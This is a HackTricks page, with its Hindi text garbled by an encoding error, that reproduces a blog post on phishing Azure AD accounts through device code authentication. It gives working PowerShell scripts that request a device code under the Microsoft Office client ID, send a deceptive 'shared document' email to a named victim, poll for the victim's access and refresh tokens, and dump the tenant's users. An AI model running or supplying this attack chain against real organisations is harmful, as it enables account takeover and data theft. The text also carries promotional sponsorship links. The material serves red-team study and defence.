# Az - рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдлрд┐рд╢рд┐рдВрдЧ

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ рдкреАрдбреАрдПрдл рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**рдж рдкреАрдПрд╕ рдлреИрдорд┐рд▓реА**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>

**рдпрд╣ рдкреЛрд╕реНрдЯ** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/) **рд╕реЗ рдХреЙрдкреА рдХреА рдЧрдИ рд╣реИред**

### рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреНрдпрд╛ рд╣реИ <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг:

> рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╕реНрдорд╛рд░реНрдЯ рдЯреАрд╡реА, IoT рдЙрдкрдХрд░рдг рдпрд╛ рдкреНрд░рд┐рдВрдЯрд░ рдЬреИрд╕реЗ рдЗрдирдкреБрдЯ-рд╕реАрдорд┐рдд рдЙрдкрдХрд░рдгреЛрдВ рдореЗрдВ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕ рдлреНрд▓реЛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрдкрдХрд░рдг рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ рдПрдХ рд╡реЗрдмрдкреЗрдЬ рдкрд░ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╕рд╛рдЗрди рдЗрди рдХрд░ рд╕рдХреЗред рдПрдХ рдмрд╛рд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рд╛рдЗрди рдЗрди рдХрд░ рд▓реЗрддрд╛ рд╣реИ, рдЙрдкрдХрд░рдг рдХреЛ рдЖрд╡рд╢реНрдпрдХрддрд╛рдиреБрд╕рд╛рд░ рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдФрд░ рд░рд┐рдлреНрд░реЗрд╢ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред

рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рд╣реЛрддреА рд╣реИ:

1. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдЙрдкрдХрд░рдг рдкрд░ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдлреНрд▓реЛ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдРрдк рдХреЛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ
2. рдРрдк Azure AD /devicecode рдЕрдВрдд-рдмрд┐рдВрджреБ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ **client\_id** рдФрд░ **resource** рднреЗрдЬрддрд╛ рд╣реИ
3. Azure AD **device\_code**, **user\_code**, рдФрд░ **verification\_url** рднреЗрдЬрддрд╛ рд╣реИ
4. рдЙрдкрдХрд░рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **verification\_url** (hxxps://microsoft.com/devicelogin) рдФрд░ **user\_code** рджрд┐рдЦрд╛рддрд╛ рд╣реИ
5. рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЦреЛрд▓рддрд╛ рд╣реИ рдФрд░ **verification\_url** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рддрд╛ рд╣реИ, рдкреВрдЫреЗ рдЬрд╛рдиреЗ рдкрд░ **user\_code** рджреЗрддрд╛ рд╣реИ рдФрд░ рд╕рд╛рдЗрди рдЗрди рдХрд░рддрд╛ рд╣реИ
6. рдЙрдкрдХрд░рдг Azure AD рдХреЛ рдкреЛрд▓ рдХрд░рддрд╛ рд╣реИ рдЬрдм рддрдХ рд╕рдлрд▓ рд▓реЙрдЧрд┐рди рдХреЗ рдмрд╛рдж рдЙрд╕реЗ **access\_token** рдФрд░ **refresh\_token** рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ

![рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдлреНрд▓реЛ](https://o365blog.com/images/posts/phishing\_5.png)

### рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд╕рд╛рде рдлрд┐рд╢рд┐рдВрдЧ <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд┐рд╢рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рд╣реИред

1. рд╣рдорд▓рд╛рд╡рд░ /devicecode рдЕрдВрдд-рдмрд┐рдВрджреБ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ **client\_id** рдФрд░ **resource** рднреЗрдЬрддрд╛ рд╣реИ
2. **verification\_uri** рдФрд░ **user\_code** рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХ рдИрдореЗрд▓ рдмрдирд╛рдХрд░ рдИрдореЗрд▓ рдореЗрдВ **verification\_uri** рдФрд░ **user\_code** рдХреЗ рд▓рд┐рдП рдПрдХ рд▓рд┐рдВрдХ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдкреАрдбрд╝рд┐рдд рдХреЛ рднреЗрдЬреЗрдВред
3. рдкреАрдбрд╝рд┐рдд рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рдХреЛрдб рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рдЗрди рдЗрди рдкреВрд░рд╛ рдХрд░рддрд╛ рд╣реИред
4. рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **access\_token** рдФрд░ **refresh\_token** рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЕрдм рд╡рд╣ рдкреАрдбрд╝рд┐рдд рдХреА рдирдХрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### 1. /devicecode рдЕрдВрдд-рдмрд┐рдВрджреБ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрдирд╛ <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

рдкрд╣рд▓рд╛ рдХрджрдо рд╣реИ Azure AD devicecode рдЕрдВрдд-рдмрд┐рдВрджреБ рдХреЛ http POST рдХрд░рдирд╛:
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
рдореИрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБред рдореИрдВрдиреЗ "рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕" рдХреНрд▓рд╛рдЗрдВрдЯ_рдЖрдИрдбреА рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдРрдк рдирд╛рдо рд▓рдЧрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЪрдпрдирд┐рдд рд╕рдВрд╕рд╛рдзрди AAD рдЧреНрд░рд╛рдл API рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ MSOnline PowerShell рдореЙрдбреНрдпреВрд▓ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

| рдкреИрд░рд╛рдореАрдЯрд░  | рдорд╛рди                                                     |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| рд╕рдВрд╕рд╛рдзрди     | [https://graph.windows.net](https://graph.windows.net/) |

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рдорд╛рди рд╣реИ:
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| рдкреИрд░рд╛рдореАрдЯрд░         | рд╡рд┐рд╡рд░рдг                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджрд░реНрдЬ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдХреЛрдб                                   |
| device\_code      | рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдП "рдкреЛрд▓" рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдЙрдкрдХрд░рдг рдХреЛрдб                    |
| verification\_url | рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ                         |
| expires\_in       | рд╕рдордп рдХреА рд╕рдорд╛рдкреНрддрд┐ рд╕реЗрдХрдВрдб рдореЗрдВ (15 рдорд┐рдирдЯ)                                 |
| interval          | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЛ рдХрд┐рддрдиреЗ рд╕реЗрдХрдВрдб рдореЗрдВ рдкреЛрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП |
| message           | рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡-рд╕реНрд╡рд░реВрдкрд┐рдд рд╕рдВрджреЗрд╢                            |

рдпрд╣рд╛рдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ devicelogin рдЕрдВрдд-рдмрд┐рдВрджреБ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ:
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**рдиреЛрдЯ!** рдореИрдВ рдПрдХ 1.0 рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реВрдБ рдЬреЛ [рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХрд░рдг](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ v2.0 рдлрд╝реНрд▓реЛ рд╕реЗ рдереЛрдбрд╝рд╛ рдЕрд▓рдЧ рд╣реИред

#### 2. рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдмрдирд╛рдирд╛ <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

рдЕрдм рдЬрдм рд╣рдорд╛рд░реЗ рдкрд╛рд╕ **verification\_url** (рд╣рдореЗрд╢рд╛ рд╕рдорд╛рди) рдФрд░ **user\_code** рд╣реИ, рд╣рдо рдПрдХ рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред

**рдиреЛрдЯ!** рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХрд╛рдо рдХрд░рдиреЗ рд╡рд╛рд▓реА smtp рд╕реЗрд╡рд╛ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдпрд╣рд╛рдВ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЖрдк рдкреАрдбрд╝рд┐рдд рдХреЛ рдлрд┐рд╢рд┐рдВрдЧ рдИрдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдИрдореЗрд▓ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ: ![рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб рдлреНрд▓реЛ](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. "рдордЫрд▓реА рдкрдХрдбрд╝рдирд╛" - рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рддрд╛ рд╣реИ <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

рдЬрдм рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рддрд╛ рд╣реИ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдЗрдЯ рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрддреА рд╣реИред рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ url рдПрдХ рд╡реИрдз Microsoft url рд╣реИред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдИрдореЗрд▓ рдореЗрдВ рджрд┐рдП рдЧрдП рдХреЛрдб рдХреЛ рджрд░реНрдЬ рдХрд░рдиреЗ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

![рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛрдб](https://o365blog.com/images/posts/phishing\_7.png)

рдХреЛрдб рджрд░реНрдЬ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдпрд╣ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рд╡рд╣ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ **Microsoft Office** рдореЗрдВ рд╕рд╛рдЗрди рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ - рдХреЛрдИ рд╕рд╣рдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧреА рдЬрд╛рддреА рд╣реИред

**рдиреЛрдЯ!** рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рдирд╣реАрдВ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ рд▓рдХреНрд╖рд┐рдд рд╕рдВрдЧрдарди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

![рд▓реЙрдЧрд┐рди](https://o365blog.com/images/posts/phishing\_8.png)

рд╕рдлрд▓ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

![рд▓рд╛рдн](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **рдЗрд╕ рдмрд┐рдВрджреБ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛ рдЬрд╛рддреА рд╣реИ!** :warning:

#### 4. рдкрд╣реБрдБрдЪ рдЯреЛрдХрди рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд▓рд┐рдП рдЕрдВрддрд┐рдо рдЪрд░рдг рд╣реИ рдкрд╣реБрдБрдЪ рдЯреЛрдХрди рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ред рдЪрд░рдг 2 рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдЕрдереЗрдВрдЯрд┐рдХреЗрд╢рди рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП Azure AD рдХреЛ рдкреЛрд▓ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╣рд░ 5 рд╕реЗрдХрдВрдб рдореЗрдВ Azure AD рдЯреЛрдХрди рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ http POST рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
рдЕрдиреБрд░реЛрдз рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ рд╢рд╛рдорд┐рд▓ рд╣реЛрдиреЗ рдЪрд╛рд╣рд┐рдП (рдХреЛрдб рд╕реНрдЯреЗрдк 1 рд╕реЗ device\_code рд╣реИ)

| рдкреИрд░рд╛рдореАрдЯрд░   | рдорд╛рди                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

рдпрджрд┐ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд▓рдВрдмрд┐рдд рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ http рддреНрд░реБрдЯрд┐ **400 Bad Request** рд▓реМрдЯрд╛рдИ рдЬрд╛рддреА рд╣реИ:
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
рдкреНрд░рд╢рд╛рд╕рдХ рдмрдирд╛рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

рдпрджрд┐ рд▓реЙрдЧрд┐рди рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдорд┐рд▓реЗрдЧреА (рдЯреЛрдХрди рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рдХрд┐рдП рдЧрдП рд╣реИрдВ):
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ Azure AD рдЯреЛрдХрди рдЕрдВрдд рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реНрдерд┐рддрд┐ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИред
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
рдЕрдм рд╣рдо рд╡рд┐рдХреНрдЯрд┐рдо рдХреА рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
